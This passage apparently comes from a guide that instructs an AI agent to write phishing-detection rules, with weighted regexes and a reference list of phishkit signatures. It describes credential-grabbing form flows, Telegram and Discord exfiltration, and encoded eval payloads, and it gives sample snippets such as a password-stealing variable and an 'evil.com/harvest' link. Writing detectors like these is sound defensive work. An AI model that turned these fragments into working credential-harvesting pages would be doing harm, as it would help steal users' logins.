  "weight": 0.35,
  "source": "js",
  "patternString": "preventDefault[\\s\\S]{0,500}getElementById[\\s\\S]{0,300}(?:password|pwd|passwd)[\\s\\S]{0,500}window\\.location\\s*=\\s*['\"]https?://(?:www\\.)?(?:wellsfargo|chase|bankofamerica|paypal|microsoft)\\.com",
  "patternFlags": "i",
  "note": "Classic phishkit flow: intercept form → grab credentials → redirect to real site. Brand alternation covers top impersonated brands."
}
```

```
### Rule 3 — ADD_TYPOSQUAT (expected lift: ~5%)
**Why it works:** Specific double-letter typosquat pattern for Wells Fargo that the domain analyzer didn't have.
```
(This would be a note that the typo is already included in Rule 1's brand entry — so Rule 3 might instead be a weight adjustment or a different source pattern.)

#### Example 2: Limited evidence — screenshot only, no page source

**Input context:**
```
URL: https://appleid-verify.top/signin
Detected brand: apple (matched via typosquat)
Heuristic score: 0.45
Screenshot: [shows Apple-style sign-in page with email and password fields]
Page content: Not available — extension data absent and live fetch not attempted.
```

**Reasoning process:**

1. The brand IS detected (Apple), so we don't need a brand entry.
2. The heuristic score is 0.45 — below 0.70 threshold. The existing typosquat signal fired but wasn't enough alone.
3. I have NO page source. I cannot see the JavaScript, form actions, or phishkit code. I cannot write source patterns.
4. The domain is `appleid-verify.top` — a suspicious TLD (`.top`) with a brand keyword pattern.

**Output:**

```
### Rule 1 — ADJUST_WEIGHT (expected lift: ~20%)
**Why it works:** The existing typosquat match for "apple" combined with the `.top` TLD should have a higher combined weight for domains matching `appleid-*` patterns specifically.
```
(Propose a signal function that checks for `appleid` as a substring in suspicious TLD domains)

```
### Rule 2 — ADD_SOURCE_PATTERN
**Cannot propose:** Page source was not captured by the extension and live fetch was not available. Source pattern proposals require actual page content to analyze. Recommend re-investigation when the page can be fetched, or manual review of similar `appleid-*` campaigns in the corpus.
```

**This is the correct response when you don't have evidence.** Do not guess at what the JavaScript might contain.

### The `source` Field: Concrete Decision Guide

If the phishing signal appears in... → use this `source` value:

| Where you see it | Example | `source` |
|---|---|---|
| A `<form action="...">` attribute | `<form action="send.php">` | `"html"` |
| An `<a href="...">` tag | `<a href="https://evil.com/harvest">` | `"html"` |
| An HTML comment | `<!-- coded by @threat_actor -->` | `"html"` |
| A `<meta>` tag | `<meta http-equiv="refresh" content="0;url=...">` | `"html"` |
| A `<title>` tag | `<title>Apple ID - Sign In</title>` | `"html"` |
| A hidden `<input>` | `<input type="hidden" name="botcheck" value="...">` | `"html"` |
| Inside a `<script>` tag (no `src`) | `fetch('https://api.telegram.org/...')` | `"js"` |
| An `onclick` / `onsubmit` handler | `<form onsubmit="grabCreds()">` | `"js"` |
| A JS variable assignment | `var stolen = document.getElementById('pwd').value` | `"js"` |
| Could be in either HTML attributes or JS code | An exfil URL that might appear as form action OR in a fetch() call | `"both"` |
| A CSS property in a `<style>` tag | `-webkit-user-select: none` | `"html"` |
| An inline style attribute | `style="display:none"` on an iframe | `"html"` |

### Common Phishkit Patterns: Quick Reference

When you see these in page source, here are the proven regex patterns and recommended weights. Use these as starting points — don't reinvent patterns that already exist.

**Telegram exfiltration** (already in ruleset as `telegram-bot-exfil`):
```
Pattern: api\\.telegram\\.org\\/bot[\\w:]{20,}\\/sendMessage
Source: js | Weight: 0.50 | Group: phishkitSignatures
```

**Discord webhook exfiltration** (already in ruleset as `discord-webhook-exfil`):
```
Pattern: discord(?:app)?\\.com\\/api\\/webhooks\\/\\d{17,19}\\/[\\w-]{60,}
Source: js | Weight: 0.50 | Group: phishkitSignatures
```

**PHP mailer endpoint** (already in ruleset as `php-mailer-endpoint`):
```
Pattern: (?:send|mail|post|grab|log|save)(?:er|\\.php)['">\s]
Source: both | Weight: 0.35 | Group: phishkitSignatures
```

**eval(atob(...)) decode chain** (already in ruleset as `eval-encoded-payload`):
```
Pattern: eval\\s*\\(\\s*(?:atob|unescape|decodeURIComponent|String\\.fromCharCode)\\s*\\(
Source: js | Weight: 0.40 | Group: obfuscation
```

**DevTools/F12 blocking** (already in ruleset as `devtools-block`):
```
Pattern: (?:addEventListener|onkeydown).*(?:keyCode|key).*(?:123|F12|devtools)
Source: js | Weight: 0.35 | Group: botEvasion
```

**Context menu disabled** (NOT in ruleset — write a NEW rule if you see this):
```
Pattern: addEventListener\\(['\"]contextmenu['\"].*preventDefault
Source: js | Weight: 0.20 | Group: botEvasion
Note: Moderate weight — some legitimate sites disable context menu
```

**Right-click disabled via oncontextmenu** (NOT in ruleset):
```
Pattern: oncontextmenu\\s*=\\s*['\"]?return\\s+false
Source: html | Weight: 0.15 | Group: botEvasion
Note: Low weight — appears on some image-protection sites too
```

**IP geolocation check** (already in ruleset as `ip-geolocation-check`):
```
Pattern: (?:ip-api\\.com|ipapi\\.co|ipinfo\\.io|geoip\\.nekudo\\.com|extreme-ip-lookup\\.com)\\/(?:json|ip)
Source: js | Weight: 0.20 | Group: botEvasion
```

**obfuscator.io variable naming** (already in ruleset as `obfuscator-io-signature`):
```
Pattern: \\b_0x[0-9a-f]{4,6}\\b
Source: js | Weight: 0.20 | Group: obfuscation
```

**Kit author comment** (already in ruleset as `kit-author-comment`):
```
Pattern: <!--\\s*(?:coded|made|created|built|designed)\\s+by\\s+\\w+\\s*(?:@|\\||#)
Source: html | Weight: 0.40 | Group: phishkitSignatures
```

**If the pattern you need is already in the ruleset** (check the "Phishkit indicators detected" and "Signals that fired" sections of your input), you don't need to propose it again. The issue is that it fired but the COMBINED score was too low — so either propose a brand entry (which adds its own weight boost) or propose an additional NEW pattern that would stack on top.

### When to Say "I Can't Write a Good Rule Here"

Not every rule-gap issue has a clean local rule solution. These are valid responses:

- **"The phishing is entirely visual — the page is a screenshot/image with no HTML form."** OCR patterns exist for this but source patterns won't help. Say so.
- **"The page uses a legitimate hosting platform (Webflow, Google Sites, Netlify) and the only distinguishing factor is the content, not the code."** A brand entry or URL heuristic may help but a source pattern probably won't — the page source is the platform's legitimate code.
- **"The page source was not available and I cannot propose source patterns without seeing the actual code."** This is better than guessing.
- **"The only distinctive pattern in the source is already covered by existing rules — the gap is a weight calibration issue, not a missing pattern."** Propose ADJUST_WEIGHT instead of inventing a redundant pattern.

Saying "I need more evidence" or "the right rule type here is X not Y" is a sign of good judgment, not a failure. The quality gate respects honest assessment over confident garbage.

---

## Summary: Three Questions Before Every Rule

**1. Would this pattern match a page that is NOT phishing?**
If yes → don't propose it, or make it more specific.

**2. Is the weight proportional to the pattern's distinctiveness?**
Match the weight to how unique the pattern is, not to how severe phishing is as a threat.

**3. Are all field values from the valid enum lists in this document?**
If you have to invent a `group`, `source`, or `vertical` value, you're doing it wrong.
